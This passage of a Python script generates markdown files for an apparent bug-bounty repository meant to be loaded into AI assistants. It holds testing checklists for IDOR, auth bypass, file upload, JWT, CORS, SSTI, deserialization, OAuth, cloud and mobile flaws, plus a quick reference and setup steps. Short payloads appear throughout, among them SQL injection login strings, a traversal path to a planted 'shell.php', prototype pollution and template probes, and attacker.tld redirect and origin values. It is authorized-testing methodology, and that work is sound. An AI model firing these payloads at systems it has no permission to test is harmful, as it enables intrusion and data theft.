- [ ] Test PUT for IMDSv2 token
- [ ] Header injection via SSRF target URL
""",

"idor.md": r"""# Checklist: IDOR / BOLA / BFLA
- [ ] Identify object IDs in URLs, body, headers (id, uid, account, org, doc, file, ticket)
- [ ] Sequential IDs — try ID±1, ID±100, IDs from other accounts
- [ ] UUIDs — collect over time, look for predictable v1 (timestamp-based)
- [ ] GET → swap with another user's ID → check for data leak
- [ ] PUT/POST/DELETE → swap with another user's ID → check for write/delete
- [ ] Verb tampering: GET → DELETE on /api/users/X
- [ ] HTTP Parameter Pollution: ?id=mine&id=yours
- [ ] Headers: X-User-ID, X-Tenant-ID, X-Account-ID
- [ ] Cookie modification (session-bound role cookies)
- [ ] JWT claims (sub, role) — re-sign if HS256/none possible
- [ ] Try with multiple session types (free/paid/admin/staff)
- [ ] BFLA: try admin endpoints with regular user token
- [ ] Test edge IDs (0, -1, MAX_INT, null, "")
- [ ] Test object types you don't own (ticket created by other user)
- [ ] Run Autorize (Burp ext) with a low-priv session for diff testing
""",

"auth_bypass.md": r"""# Checklist: Auth Bypass
- [ ] Test SQLi in login (`admin'-- -`, `' OR 1=1-- -`)
- [ ] Test default creds (admin/admin, admin/password, root/root, test/test)
- [ ] Test rate limiting on login (X-Forwarded-For bypass)
- [ ] Test password reset flow (token entropy, expiry, reuse)
- [ ] Test 2FA bypass (response manipulation, token reuse, downgrade to SMS)
- [ ] Test OAuth flow (state CSRF, redirect_uri abuse, code interception)
- [ ] Test SAML (XSW, comment-injection, signature bypass)
- [ ] Test session fixation (preset SESSION cookie, login → it persists)
- [ ] Test session validity (logout properly invalidates? cookies expire?)
- [ ] Test concurrent sessions (race on login)
- [ ] Test JWT attacks (alg:none, weak key, kid injection, jku/x5u)
- [ ] Test header-based auth bypass (X-Forwarded-User, X-Original-URL, X-Rewrite-URL)
- [ ] Test admin path with no creds (might be IP-allowlisted but allowlist is bypassable)
- [ ] Test GraphQL queries that bypass auth middleware
- [ ] Test sensitive endpoints with empty auth, malformed token, expired token
- [ ] Test mass assignment to escalate role
""",

"file_upload.md": r"""# Checklist: File Upload
- [ ] Upload .html with `<script>` → check if served (XSS)
- [ ] Upload .svg with embedded JS → check if served as image/svg
- [ ] Upload .pdf with embedded JS / form → check if rendered
- [ ] Upload polyglot (`.jpg.php`, `image.php.gif`, `image.gif.php`)
- [ ] Test extension bypass: double ext, null byte, capital, `.phtml`, `.phar`, `.php5`, `.pht`, `.shtml`, `.asp`, `.aspx`, `.cer`, `.jsp`, `.jspx`
- [ ] Test MIME tampering: `Content-Type: image/jpeg` with PHP body
- [ ] Test magic bytes (GIF89a + PHP)
- [ ] Test path traversal in filename: `../../../var/www/html/shell.php`
- [ ] Test ZIP slip on archive uploads
- [ ] Test SSRF in upload-from-URL endpoints
- [ ] Test unrestricted size → DoS
- [ ] Test SSTI in EXIF metadata for server-side render
- [ ] Test if files are stored on /tmp and exec'd by background worker
- [ ] Test for race condition in upload + scan + serve
- [ ] Test stored XSS in filename
- [ ] Check executable extension on Windows (.exe, .bat, .ps1) for SMB / cron paths
""",

"jwt.md": r"""# Checklist: JWT
- [ ] Decode header + payload (jwt.io / jwt_tool)
- [ ] Test alg:none variants
- [ ] Test HS256 with known weak keys (rockyou, common secrets)
- [ ] Test alg confusion RS256 → HS256 (sign with public key as HS secret)
- [ ] Test kid injection (path traversal, SQLi)
- [ ] Test jku / x5u to attacker-controlled JWKS
- [ ] Test embedded jwk in header
- [ ] Test trailing whitespace / case variants on alg
- [ ] Test missing signature
- [ ] Test signature truncation
- [ ] Test exp / nbf / iat / aud / iss validation (manipulate to bypass)
- [ ] Test sub / role manipulation
- [ ] Test re-use after logout (revocation list?)
- [ ] Test cross-tenant token reuse
- [ ] Test token in Authorization header vs cookie vs body
""",

"cors.md": r"""# Checklist: CORS
- [ ] Send Origin: https://attacker.tld → check ACAO + ACAC headers
- [ ] Test Origin: null (sandboxed iframe)
- [ ] Test prefix: https://allowed.com.attacker.tld
- [ ] Test suffix: https://attacker.com → if allowed
- [ ] Test path: https://attacker.com/allowed.com
- [ ] Test scheme: https://attacker.com vs http://attacker.com
- [ ] Confirm endpoint actually serves authenticated data (not public)
- [ ] If ACAC:true and Origin reflected → high-impact CORS
- [ ] PoC: cross-origin fetch with credentials → exfil response
- [ ] Test on every authenticated GET endpoint, not just /api/me
""",

"ssti.md": r"""# Checklist: SSTI
- [ ] Probe `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`
- [ ] Identify engine via probes / response body / framework
- [ ] Achieve RCE via gadget chain (engine-specific)
- [ ] Read environment / files
- [ ] Bypass sandbox (older Twig, Jinja2 with __mro__ traversal, Velocity)
- [ ] Test in: email body customization, error message templates, name field, admin notifications
- [ ] Test in PDF/HTML report generators
- [ ] Test in Marketing email templates
""",

"deserialization.md": r"""# Checklist: Deserialization
- [ ] Identify deserialization sink (Java ObjectInputStream, .NET BinaryFormatter, Python pickle, PHP unserialize, Node serialize, Ruby Marshal/YAML)
- [ ] Find serialized data in: cookies, hidden inputs, body, headers
- [ ] Probe with URLDNS chain (Java) or OOB DNS payload (others) — silent confirmation
- [ ] Use ysoserial / ysoserial.net / pickle for chain generation
- [ ] Test with multiple chains (CommonsCollections1-7, Spring, ROME for Java)
- [ ] If RCE — drop reverse shell, read /etc/passwd, etc.
- [ ] Check for type-confusion gadgets (Json.Net TypeNameHandling=All, FastJson)
- [ ] Test error-based detection if blind (cause exception, leak class names)
""",

"csrf.md": r"""# Checklist: CSRF
- [ ] Identify state-changing endpoints (email change, password change, transfer, delete)
- [ ] Check for CSRF token (in form, in header, in cookie)
- [ ] Test removing token → does request still succeed?
- [ ] Test empty token
- [ ] Test attacker's own token (from another account)
- [ ] Test Method override (X-HTTP-Method-Override: POST via GET)
- [ ] Test SameSite cookie attribute (Lax allows top-level GET; Strict blocks all)
- [ ] Test JSON CSRF with text/plain enctype
- [ ] Test if Referer/Origin checked → bypass via missing/null origin
- [ ] Build auto-submit HTML PoC + show impact
""",

"oauth.md": r"""# Checklist: OAuth
- [ ] Identify flow type (auth code, implicit, PKCE)
- [ ] Test redirect_uri allowlist bypasses (subdomain, scheme, query, hash, path traversal)
- [ ] Test state parameter — missing → CSRF / forced linking
- [ ] Test code reuse (single-use enforced?)
- [ ] Test code expiry
- [ ] Test access_token in URL fragment vs body
- [ ] Test scope escalation (request more scopes than UI allows)
- [ ] Test session fixation via OAuth callback
- [ ] Test OIDC id_token validation (alg, signature, aud, iss)
- [ ] Test for confused deputy (account-linking abuse)
""",

"graphql.md": r"""# Checklist: GraphQL
- [ ] Test introspection enabled
- [ ] If disabled, run clairvoyance for partial schema recovery
- [ ] Run Inql/graphql-cop for misconfigs
- [ ] Test for SQLi/NoSQLi in string args
- [ ] Test BOLA on every query/mutation that takes ID
- [ ] Test BFLA — admin mutations callable by non-admin
- [ ] Test rate limiting per query (alias-based DoS, batched queries)
- [ ] Test query depth — recursive nested queries → DoS
- [ ] Test field suggestion typos for unauth introspection leak
- [ ] Test mutation visibility — sensitive ops should be in scope-locked schema
""",

"cloud_aws.md": r"""# Checklist: AWS Misconfig
- [ ] S3 bucket policy: public read/write/list
- [ ] Bucket ACL allows AllUsers / AuthenticatedUsers
- [ ] EC2 IMDSv1 still enabled (downgrade attack via SSRF)
- [ ] IAM: MFA not enforced, root keys exist, * actions in policies
- [ ] IAM credentials report — last-used, key-rotation
- [ ] Security groups with 0.0.0.0/0 on SSH/RDP/DB
- [ ] Public RDS endpoint (publicly_accessible=true)
- [ ] Lambda function URL public + IAM role overpermissioned
- [ ] CloudTrail not enabled / not multi-region
- [ ] GuardDuty not enabled
- [ ] EBS snapshots / AMIs publicly shared
- [ ] SNS / SQS topics publicly accessible
- [ ] CloudFront with insecure origin (HTTP)
- [ ] ECR public registry leaking images
- [ ] Secrets Manager / SSM Parameter Store with public read
""",

"mobile_android.md": r"""# Checklist: Mobile Android
- [ ] Decompile APK (jadx, apktool)
- [ ] Check exported activities, services, providers, receivers
- [ ] Check deep links (intent filters)
- [ ] Check WebView config (JS enabled, file:// scheme, addJavascriptInterface)
- [ ] Hardcoded secrets in strings.xml / java code
- [ ] Cleartext HTTP (cleartextTrafficPermitted, network_security_config.xml)
- [ ] Cert pinning + bypass (objection, frida-multiple-unpinning)
- [ ] Backup allowed (android:allowBackup="true")
- [ ] Debuggable (android:debuggable="true")
- [ ] Test for MASVS V1-V8 controls
- [ ] Frida-based runtime hooking + tracing
- [ ] Burp proxy on emulator / Magisk root device
""",

"api_general.md": r"""# Checklist: API General
- [ ] Discover API version paths (/v1, /v2, /api, /rest, /graphql, /grpc)
- [ ] Test all CRUD verbs on every resource
- [ ] Test for BOLA, BFLA on every endpoint
- [ ] Test for missing auth (drop Authorization header)
- [ ] Test for missing rate limiting (especially on PUT/DELETE)
- [ ] Test for mass assignment (extra JSON fields)
- [ ] Test for filter injection (sort, filter, raw query params)
- [ ] Test pagination bypass (offset, page, limit edge cases)
- [ ] Test content-type juggling (JSON ↔ form ↔ XML)
- [ ] Check Swagger / OpenAPI docs (if exposed)
- [ ] Check API gateway behavior (path normalization, header pass-through)
""",

"recon_aws.md": r"""# Checklist: AWS Recon
- [ ] Find AWS account ID (from policies, error messages, CloudFront responses)
- [ ] S3 bucket name brute (target name + variations: -dev, -prod, -staging, -backup)
- [ ] Use cloud_enum, S3Scanner
- [ ] Check public ECR images (`aws ecr-public describe-repositories --region us-east-1`)
- [ ] Check public AMIs (`aws ec2 describe-images --owners <accountid>`)
- [ ] Check exposed ELB endpoints (DNS pattern)
- [ ] CloudFront distribution origin discovery (cf-id, certs, JARM)
- [ ] Lambda function URLs (public-by-default)
- [ ] Cognito user pools (default UI exposed)
- [ ] API Gateway stages with default-allow
""",

"prototype_pollution.md": r"""# Checklist: Prototype Pollution
- [ ] Probe `__proto__[admin]=true` in query string
- [ ] Probe `{"__proto__":{"admin":true}}` in JSON body
- [ ] Probe `constructor[prototype][admin]=true`
- [ ] Confirm pollution via `{}.admin` in browser console (client-side) or via gadget detection (server-side)
- [ ] Find gadget — look for `merge`, `extend`, `assign`, `set`, `defaultsDeep`, `cloneDeep` calls
- [ ] Client gadgets: jQuery $.get, AngularJS, Lodash _.template, React dangerouslySetInnerHTML
- [ ] Server gadgets: Express render options, child_process spawn, lodash template, hbs render
- [ ] Test ppfuzz / ppmap against the app
""",

"open_redirect.md": r"""# Checklist: Open Redirect
- [ ] Find redirect parameters (url, redirect, next, return, callback, dest, link, ref)
- [ ] Test //attacker.tld
- [ ] Test http://allowed.tld@attacker.tld
- [ ] Test backslash variants \\\\attacker.tld, \\/attacker.tld
- [ ] Test data:, javascript: schemes (if response renders as link)
- [ ] Test CRLF injection in redirect
- [ ] Chain with OAuth flow → token leak → ATO
- [ ] Test SAML RelayState
- [ ] Test password reset URL → leak token via referer
""",

"clickjacking.md": r"""# Checklist: Clickjacking
- [ ] Check for X-Frame-Options / Content-Security-Policy frame-ancestors
- [ ] If missing → test with iframe
- [ ] Check sensitive endpoints (account delete, transfer, OAuth approve)
- [ ] Build PoC with overlay button
- [ ] Show impact (state-changing action triggered without consent)
""",

"race_conditions.md": r"""# Checklist: Race Conditions
- [ ] Find state-checked endpoints (redeem, withdraw, accept, claim, vote, reset)
- [ ] Use Burp Turbo Intruder race-single-packet-attack
- [ ] Send 20-30 concurrent requests via HTTP/2
- [ ] Verify multi-success (multiple 200s where logically single)
- [ ] Quantify financial / privilege impact
- [ ] Don't run thousands of races in production
""",

"cache_poisoning.md": r"""# Checklist: Cache Poisoning
- [ ] Identify cached endpoints (Cache-Control: public, X-Cache: HIT, CF-Cache-Status: HIT)
- [ ] Use Param Miner to find unkeyed inputs
- [ ] Test X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, X-Host, Forwarded
- [ ] Inject XSS / redirect via unkeyed header
- [ ] Confirm next clean request gets poisoned response
- [ ] Use cache-buster (`?cb=<random>`) during testing — don't poison real users
""",
}

for fname, content in checklists.items():
    w(f"CHECKLISTS/{fname}", content)

# ═════════════════════════════════════════
# INDEX, QUICK_REFERENCE, DAY1_SETUP
# ═════════════════════════════════════════
print("=== SYNTHESIS ===")

# Build index by walking the tree
import os
def gen_index():
    lines = ["# BugBounty-AI-System — Master Index", "", "Complete navigation map of all skill files, payloads, knowledge-base entries, and checklists.", ""]
    for top in ['MASTER_SYSTEM_PROMPTS', 'SKILL_FILES', 'KNOWLEDGE_BASE', 'CHECKLISTS']:
        d = ROOT / top
        if not d.exists(): continue
        lines.append(f"## {top}")
        for path, dirs, files in sorted(os.walk(d)):
            rel = Path(path).relative_to(ROOT)
            depth = len(rel.parts) - 1
            indent = "  " * depth
            if depth > 0:
                lines.append(f"{indent}- **{Path(path).name}/**")
            for fn in sorted(files):
                if fn.endswith('.md'):
                    fp = Path(path) / fn
                    rel_link = fp.relative_to(ROOT).as_posix()
                    nice = fn[:-3].replace('_',' ').title()
                    lines.append(f"{indent}  - [{nice}]({rel_link})")
        lines.append("")
    return "\n".join(lines)

w("INDEX.md", gen_index())

w("QUICK_REFERENCE.md", r"""# QUICK REFERENCE — BugBounty-AI-System

One-page operational cheatsheet. Bookmark this.

## ACTIVATION TRIGGERS (load corresponding skill)

| Trigger | Skill loaded |
|---------|--------------|
| `RECON MODE` | SKILL_FILES/RECON/* |
| `WEB MODE` | SKILL_FILES/VULNERABILITIES/WEB/* |
| `API MODE` | SKILL_FILES/VULNERABILITIES/API/* |
| `LLM MODE` | SKILL_FILES/VULNERABILITIES/LLM_AI/* |
| `MOBILE MODE` | SKILL_FILES/VULNERABILITIES/MOBILE/* |
| `INFRA MODE` | SKILL_FILES/VULNERABILITIES/INFRA/* |
| `SCR MODE` | SKILL_FILES/SOURCE_CODE_REVIEW/* |
| `PAYLOAD <class>` | SKILL_FILES/PAYLOADS/<class>.md |
| `EXPLOIT MODE` | SKILL_FILES/EXPLOIT_DEVELOPMENT/* |
| `REPORT MODE` | SKILL_FILES/REPORTING/* |
| `STRATEGY MODE` | SKILL_FILES/MINDSET_STRATEGY/* |

## HUNT WORKFLOW

```
1. RECON → enumerate, fingerprint, prioritize (16_recon_automation_pipeline.md)
2. ANALYSIS → map auth model, parameters, surfaces (BHM Day 2)
3. HUNT → manual + nuclei + fuzzing on prioritized assets
4. EXPLOIT → PoC + chain to maximize impact
5. REPORT → impact, repro, remediation
6. FOLLOWUP → respond fast to triage, escalate respectfully
```

## TOP-VALUE ENDPOINTS

- /api/admin/*, /api/internal/*
- /oauth/authorize, /oauth/token, /sso/*
- /upload, /import, /export, /backup
- /search, /filter, /sort, /preview
- /webhook, /callback
- /graphql, /api/v[0-9]+/*
- /actuator/* (Spring), /admin (most CMSes)
- /.git, /.env, /.well-known/*

## TOP-VALUE PARAMETERS

id, user, account, org, tenant, redirect, next, return, callback, url, file, path, template, view, cmd, exec, eval, query, search, q, filter, email, role, permission, is_admin, _method, _csrf, format, output

## CRITICAL CHAINS

| Chain | Outcome |
|-------|---------|
| XSS in admin → ATO | Critical |
| SSRF → IMDS → AWS keys | Critical |
| Subdomain takeover + cookie scope | Critical (ATO) |
| Open redirect + OAuth | Critical (ATO) |
| Race + IDOR | Critical (priv esc / fraud) |
| PP + gadget | RCE |
| LFI + log poisoning | RCE |
| File upload polyglot + Web Apache | RCE |

## DAILY TOOL STACK

```
subfinder | httpx | nuclei | katana | gau | dalfox | sqlmap | ffuf | Burp Pro | Frida | Semgrep | trufflehog
```

## REFERENCES (top 10)

1. PortSwigger Web Security Academy
2. HackerOne Hacktivity (top P1 disclosed)
3. PayloadsAllTheThings
4. PortSwigger Research Blog
5. zseanos-methodology.pdf
6. Bug Hunters Methodology Day 1 + 2 (jhaddix)
7. Web Application Hacker's Handbook
8. JavaScript for Hackers (Gareth Heyes)
9. The Tangled Web (Michal Zalewski)
10. Black Hat Python (Justin Seitz)
""")

w("DAY1_SETUP.md", r"""# DAY 1 SETUP — BugBounty-AI-System

How to deploy and start using this system.

## 1. EXTRACT THE TARBALL
```bash
tar -xzf BugBounty-AI-System.tar.gz
cd BugBounty-AI-System
```

## 2. PUSH TO YOUR REPO (OPTIONAL)
```bash
git init
git add .
git commit -m "Initial BugBounty-AI-System import"
git remote add origin git@github.com:youruser/bbai.git
git push -u origin main
```

## 3. OPTIONAL: MIRROR TO OBSIDIAN
- Open Obsidian → Open folder as vault → point at `BugBounty-AI-System/`
- All `.md` files become navigable notes with backlinks via INDEX.md.

## 4. LOAD MASTER SYSTEM PROMPT INTO YOUR LLM

### Claude (recommended)
- Open Claude → Projects → New Project → "BugBounty Hunter Oracle"
- System prompt: paste contents of `MASTER_SYSTEM_PROMPTS/claude_master_system_prompt.md`
- Project knowledge: upload all `.md` files in this repo (or just SKILL_FILES + PAYLOADS + KNOWLEDGE_BASE).
- Use Claude Sonnet/Opus 4.x.

### ChatGPT
- Settings → Custom Instructions → paste `chatgpt_master_system_prompt.md`
- For Custom GPT: upload SKILL_FILES + KNOWLEDGE_BASE as files.

### GitHub Copilot
- In your repo: create `.github/copilot-instructions.md` with contents from `github_copilot_instructions.md`.

### Local Model (Ollama / LM Studio)
- Use `local_model_system_prompt.md` as system message for Llama 3.x / Qwen / etc.
- For RAG: index `KNOWLEDGE_BASE/` + `SKILL_FILES/PAYLOADS/` with sentence-transformers + Chroma.

## 5. INSTALL THE TOOL STACK
See `SKILL_FILES/AUTOMATION/vps_setup_hunting.md` for the full install script.

Quick start:
```bash
# Install Go tools
GO111MODULE=on
for t in projectdiscovery/subfinder/v2/cmd/subfinder \\
         projectdiscovery/httpx/cmd/httpx \\
         projectdiscovery/nuclei/v3/cmd/nuclei \\
         projectdiscovery/katana/cmd/katana \\
         projectdiscovery/dnsx/cmd/dnsx \\
         projectdiscovery/naabu/v2/cmd/naabu \\
         projectdiscovery/chaos-client/cmd/chaos \\
         projectdiscovery/notify/cmd/notify \\
         lc/gau/v2/cmd/gau \\
         tomnomnom/waybackurls \\
         tomnomnom/anew \\
         tomnomnom/qsreplace \\
         hahwul/dalfox/v2 \\
         ffuf/ffuf/v2; do
  go install -v github.com/$t@latest
done

# Update Nuclei templates
nuclei -update-templates

# Wordlists
git clone https://github.com/danielmiessler/SecLists ~/wordlists/SecLists
```

## 6. CREATE TARGET WORKSPACE
```bash
mkdir -p ~/targets/<target>
cd ~/targets/<target>
# Copy CHECKLISTS/recon_passive.md and recon_active.md as your TODO
```

## 7. SET UP NOTIFICATIONS
See `SKILL_FILES/AUTOMATION/notification_telegram_discord.md`.

```bash
export TG_BOT_TOKEN=...
export TG_CHAT_ID=...
export DISCORD_WH=...
```

## 8. SCHEDULE PIPELINES
See `SKILL_FILES/AUTOMATION/recon_pipeline_automation.md` and `monitoring_*.md`.

```cron
0 3 * * * /home/hunter/scripts/recon.sh target.tld >> /var/log/recon.log 2>&1
*/30 * * * * /home/hunter/scripts/scope_watch.sh hackerone-target
```

## 9. FIRST HUNT SESSION
1. Pick a target from `MINDSET_STRATEGY/target_selection.md`.
2. Run `passive_recon.md` checklist completely (1h).
3. Run `active_recon.md` checklist (2h).
4. Triage alive set with httpx -tech-detect → manual eyeball top 50.
5. Pick highest-value endpoint per `high_value_target_prioritization.md`.
6. Apply VULNERABILITIES/WEB/* for each candidate.
7. Document findings → REPORTING/* template.

## 10. UPDATE THIS REPO
Treat it as living documentation:
- New technique you learn → add to relevant KNOWLEDGE_BASE entry.
- New tool → add to AUTOMATION or SCRIPTING.
- New chain → add to EXPLOIT_DEVELOPMENT/exploit_chain_building.md.
- Quarterly review SKILL_FILES versions → bump version number, append change log.

## REFERENCES
- All file paths above resolve relative to repo root.
- `INDEX.md` is the master navigation.
- `QUICK_REFERENCE.md` is the one-page cheat sheet.

Happy hunting.
""")

print("=== Done with KB + CHECKLISTS + SYNTHESIS ===")
